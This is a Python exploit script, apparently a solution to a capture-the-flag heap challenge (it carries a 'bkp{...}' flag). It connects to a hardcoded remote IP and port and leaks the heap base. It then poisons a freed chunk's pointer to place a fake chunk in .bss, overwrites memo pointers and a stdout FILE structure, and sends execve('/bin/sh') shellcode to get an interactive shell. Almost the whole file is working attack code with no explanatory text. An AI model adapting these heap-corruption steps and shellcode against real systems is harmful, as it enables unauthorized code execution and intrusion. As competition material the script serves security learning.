from pwnlib import *

# bkp{you are a talented and ambitious hacker}

fake_chunk_addr = 0x602a20

def deliver(n, payload):
	s.send("1\n")

	s.ru("Index: ")
	s.send("%d\n" % n)

	s.ru("Length: ")
	s.send("999\n")

	s.ru("mo though\n")
	s.send(payload)

	s.ru(" Quit.\n>> ")


def add(n):
	s.send("1\n")

	s.ru("Index: ")
	s.send("%d\n" % n)

	s.ru("Length: ")
	s.send("32\n")

	s.ru("Message: ")
	s.send("aaaa\n")

	s.ru(" Quit.\n>> ")

def delete(n):
	s.send("4\n")

	s.ru("Index: ")
	s.send("%d\n" % n)

	s.ru(" Quit.\n>> ")



def login():
	s.ru("ser name: ")
	s.send("aaaa\n")

	s.ru("rd? (y/n) ")
	s.send("y\n")

	s.ru("Password: ")
	s.send("bbbb\n")

	s.ru(" Quit.\n>> ")

def edit():
	s.send("1\n")

	s.ru("Index: ")
	s.send("1\n")

	s.ru("Length: ")
	s.send("12\n")

	s.ru("Message: ")
	s.send("cccc\n")

	s.ru(" Quit.\n>> ")
	s.send("2\n")

	s.ru(" message: ")
	s.send("qqqq\n")

	s.ru("this is edited message!\n")
	leaked = s.ru("\n\n")
	s.ru(" Quit.\n>> ")
	return leaked

	

#s = Socket(("localhost", 6767))
s = Socket(("54.202.2.54", 8888))


login()

heap_base = uq(edit().ljust(8, '\0')) - 0x10
assert heap_base & 0xfff == 0

print "heap: 0x%x" % heap_base

add(2)
add(3)
add(4)


delete(4)
delete(3)
delete(2)



payload = "A"*(8*5) + pq(0x31) + pq(fake_chunk_addr)
deliver(2, payload)


add(3)



# change user/pass

payload = pq(0) + pq(0x31) 

s.send("5\n")

s.ru("Password: ")
s.send("bbbb\n")

s.ru("ser name: ")
s.send(payload)

s.ru("password: ")
s.send("wwwwwwwwwwww\n")

s.ru(" Quit.\n>> ")


# alloc in bss, overflow

payload = "A"*0x30
payload += pd(0x300)*4 # sizes

# memos
payload += pq(0x6029e0) # stdout
payload += pq(0xdeadbeef)
payload += pq(0xdeadbeef)
payload += pq(0xdeadbeef)


payload += pq(0x00000000fbad2887)
payload += pattern(0x80)
payload += pq(0x602e60)
payload += "\x00"*0x48
payload += pq(0x602b70 - 0x38)
payload += pq(0x400b47)


deliver(4, payload)


s.send("1\n")

s.ru("Index: ")
s.send("0\n")

s.ru(" Quit.\n>> ")
s.send("2\n")

raw_input("> ")
s.ru(" message: ")
s.send(pq(0x602a90))





s.ru("you can write anything here")

s.send("31c05048b92f2f62696e2f736851545f5057545e99b03b0f05".decode("hex"))


s.interact()
